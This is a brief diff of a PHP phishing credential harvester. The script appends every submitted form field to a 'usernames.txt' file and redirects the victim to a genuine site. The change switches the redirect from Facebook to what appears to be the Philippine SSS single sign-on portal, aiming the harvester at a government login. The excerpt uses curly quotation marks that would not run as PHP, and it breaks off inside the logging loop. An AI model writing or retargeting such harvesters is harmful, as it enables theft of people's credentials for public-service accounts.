@@ -1,5 +1,5 @@
 <?php
-header (‘Location:http://www.facebook.com/’);
+header (‘Location:https://sso.sss.gov.ph/’);
 $handle = fopen(“usernames.txt”, “a”);
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
